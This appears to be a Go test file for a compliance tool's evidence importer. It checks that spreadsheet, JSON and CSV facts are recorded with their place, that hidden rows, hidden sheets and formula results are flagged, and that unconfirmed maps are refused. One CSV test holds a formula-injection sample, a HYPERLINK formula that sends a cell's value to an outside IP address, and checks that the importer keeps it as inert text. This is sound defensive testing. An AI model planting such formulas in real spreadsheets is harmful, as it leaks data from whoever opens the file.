// SPDX-FileCopyrightText: 2026 Rashik Adhikari
// SPDX-License-Identifier: Apache-2.0

package evidence

import (
	"archive/zip"
	"bytes"
	"errors"
	"slices"
	"strings"
	"testing"

	"github.com/quilzo/quilzo/internal/register"
)

// workbook writes a workbook's parts into a zip, as a spreadsheet program
// would save them.
func workbook(t testing.TB, parts map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	names := make([]string, 0, len(parts))
	for n := range parts {
		names = append(names, n)
	}
	slices.Sort(names)
	for _, n := range names {
		w, err := zw.Create(n)
		if err != nil {
			t.Fatal(err)
		}
		w.Write([]byte(parts[n]))
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

const (
	ns    = `xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"`
	relWS = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet"
)

// devicesBook is a workbook of devices with a row somebody hid, a formula
// whose cached result says yes, and a hidden sheet.
func devicesBook(t testing.TB) []byte {
	return workbook(t, map[string]string{
		"xl/workbook.xml": `<?xml version="1.0"?><workbook ` + ns + `><sheets><sheet name="Devices" sheetId="1" r:id="rId1"/>` +
			`<sheet name="Scratch" sheetId="2" state="hidden" r:id="rId2"/></sheets></workbook>`,
		"xl/_rels/workbook.xml.rels": `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">` +
			`<Relationship Id="rId1" Type="` + relWS + `" Target="worksheets/sheet1.xml"/>` +
			`<Relationship Id="rId2" Type="` + relWS + `" Target="worksheets/sheet2.xml"/></Relationships>`,
		"xl/worksheets/sheet1.xml": `<?xml version="1.0"?><worksheet ` + ns + `><sheetData>` +
			`<row r="1"><c r="A1" t="inlineStr"><is><t>Serial</t></is></c><c r="B1" t="inlineStr"><is><t>Encrypted</t></is></c></row>` +
			`<row r="2"><c r="A2" t="inlineStr"><is><t>C1</t></is></c><c r="B2" t="b"><v>1</v></c></row>` +
			`<row r="3" hidden="1"><c r="A3" t="inlineStr"><is><t>C2</t></is></c><c r="B3" t="b"><v>0</v></c></row>` +
			`<row r="4"><c r="A4" t="inlineStr"><is><t>C3</t></is></c><c r="B4" t="b"><f>TRUE()</f><v>1</v></c></row>` +
			`</sheetData></worksheet>`,
		"xl/worksheets/sheet2.xml": `<?xml version="1.0"?><worksheet ` + ns + `><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>x</t></is></c></row></sheetData></worksheet>`,
	})
}

// A workbook read through a map yields its facts with where each was read,
// and a fact read from a row somebody hid, or from a formula's cached
// result, is marked so; the workbook's hidden parts are listed once.
func TestMappedXLSXMarksHiddenFacts(t *testing.T) {
	w := newWorld(t, false)
	m := &register.ColumnMap{Name: "devices", Makes: "Observation", Format: "xlsx", Sheet: "Devices",
		Columns: []register.MapColumn{{Field: "about", Column: "Serial", Asset: "device"}},
		Facts:   []register.MapFact{{Fact: "disk.encrypted", Column: "Encrypted"}}}
	res := w.ingest(t, person, Input{Format: FormatXLSX, Body: devicesBook(t), Map: m})
	byPlace := map[string]register.Observation{}
	for _, o := range observations(t, w.reg) {
		byPlace[o.Place] = o
	}
	for place, want := range map[string]struct {
		value bool
		taint register.Taint
	}{"Devices!B2": {true, ""}, "Devices!B3": {false, "hidden-row"}, "Devices!B4": {true, "formula"}} {
		o, ok := byPlace[place]
		if !ok {
			t.Fatalf("no fact was read at %s: %v", place, byPlace)
		}
		if o.Value.Value() != want.value || o.Taint != want.taint {
			t.Errorf("%s reads %v tainted %q, not %v tainted %q", place, o.Value.Value(), o.Taint, want.value, want.taint)
		}
	}
	if res.Batch.Raw.Tainted != 2 {
		t.Errorf("the seal's record counts %d tainted facts, not 2", res.Batch.Raw.Tainted)
	}
	var flags []string
	for _, f := range res.Batch.Flags {
		flags = append(flags, string(f.Taint)+" "+f.Where)
	}
	for _, want := range []string{"hidden-sheet Scratch", "hidden-row Devices!3", "formula Devices!B4"} {
		if !slices.Contains(flags, want) {
			t.Errorf("the flags do not say %q: %v", want, flags)
		}
	}
}

// A JSON list is read into any kind a table can make: here, statements a
// person made about controls, each control named by its reference. The
// importer gives each record its grade, its raw digest and its place; the
// map gives the rest.
func TestMappedJSONToAnyKind(t *testing.T) {
	w := newWorld(t, false)
	body := []byte(`{"export":{"items":[` +
		`{"control":"AC-01","result":"pass","checked":"2026-11-01","by":"d0000000000000000000000000000001"},` +
		`{"control":"AC-02","result":"fail","checked":"2026-11-02T09:30:00Z","by":"d0000000000000000000000000000001"}]}}`)
	m := &register.ColumnMap{Name: "statements", Makes: "Evidence", Format: "json", Rows: "/export/items",
		Columns: []register.MapColumn{{Field: "control", Column: "control", Of: "Control"},
			{Field: "outcome", Column: "result"}, {Field: "at", Column: "checked"}}}
	res := w.ingest(t, person, Input{Format: FormatJSON, Body: body, Map: m})
	entries, _, err := w.reg.List(register.KindEvidence, 0, 10)
	if err != nil || len(entries) != 2 {
		t.Fatalf("%d evidence records, %v", len(entries), err)
	}
	ac01, _ := register.DeriveID(register.KindControl, register.Local, "AC-01")
	found := false
	for _, e := range entries {
		ev := e.Record.(register.Evidence)
		if ev.Grade != register.GradeUploaded || ev.Raw != res.Batch.Digest || !strings.HasPrefix(ev.Place, "/export/items/") {
			t.Errorf("the evidence is %+v", ev)
		}
		if ev.Control == ac01 {
			found = true
			if ev.Outcome != register.Pass || ev.At.At().Format("2006-01-02") != "2026-11-01" {
				t.Errorf("AC-01's evidence is %+v", ev)
			}
		}
	}
	if !found {
		t.Error("the evidence does not point at control AC-01 by its reference")
	}
}

// A CSV cell a spreadsheet would run as a formula is never run here: it is
// kept as the text it is and marked as a formula's.
func TestCSVFormulaCellNeverRun(t *testing.T) {
	body := []byte("Serial,Encrypted\nC1,\"=HYPERLINK(\"\"http://198.51.100.7/?\"\"&A1,\"\"yes\"\")\"\nC2,true\n")
	m := laptopMap()
	m.Facts = []register.MapFact{{Fact: "disk.encrypted", Column: "Encrypted"}}
	m.Columns[0].Name = ""
	b, err := Read(Input{Format: FormatCSV, Body: body, Map: m})
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range b.Facts {
		if f.Kind != register.KindObservation {
			continue
		}
		switch f.Place {
		case "B2":
			if f.Taint != "formula" || !strings.HasPrefix(f.Value, "=HYPERLINK") {
				t.Errorf("the formula cell reads %q tainted %q", f.Value, f.Taint)
			}
		case "B3":
			if f.Taint != "" || f.Value != "true" {
				t.Errorf("a plain cell reads %q tainted %q", f.Value, f.Taint)
			}
		}
	}
}

// A draft map is drafted from a table's headings, and is no map until a
// person confirms it: an import through a map not in the register is
// refused.
func TestDraftMapNeedsConfirming(t *testing.T) {
	d, err := DraftMap(FormatCSV, []byte(laptops), "Observation", "laptops", "")
	if err != nil {
		t.Fatal(err)
	}
	if len(d.Map.Columns) != 1 || d.Map.Columns[0].Column != "Serial" || d.Map.Columns[0].Asset != "device" {
		t.Errorf("the draft reads what the facts are about as %+v", d.Map.Columns)
	}
	var facts []string
	for _, f := range d.Map.Facts {
		facts = append(facts, f.Fact)
	}
	if strings.Join(facts, ",") != "hostname,encrypted,owner" || len(d.Sample) != 3 {
		t.Errorf("the draft's facts are %v and its sample %v", facts, d.Sample)
	}
	w := newWorld(t, false)
	if _, err := w.g.Ingest(person, "", Input{Format: FormatCSV, Body: []byte(laptops), Map: &d.Map}); !errors.Is(err, ErrNoMap) {
		t.Fatalf("an import through a draft nobody confirmed: %v", err)
	}
	if _, err := Read(Input{Format: FormatCSV, Body: []byte(laptops)}); !errors.Is(err, ErrNoMap) {
		t.Fatalf("a table with no map: %v", err)
	}
}

// What the importer writes of every record is not a column's to write: a
// map that reads the grade, the raw digest or the place from the file is
// refused, as is one that reads an observation's source.
func TestMapRefusesImporterFields(t *testing.T) {
	for _, field := range []string{"grade", "raw", "place", "taint", "source"} {
		m := laptopMap()
		m.Columns = append(m.Columns, register.MapColumn{Field: field, Column: "Owner"})
		if err := register.Validate(*m); err == nil {
			t.Errorf("a map that reads %s from a column is accepted", field)
		}
	}
}
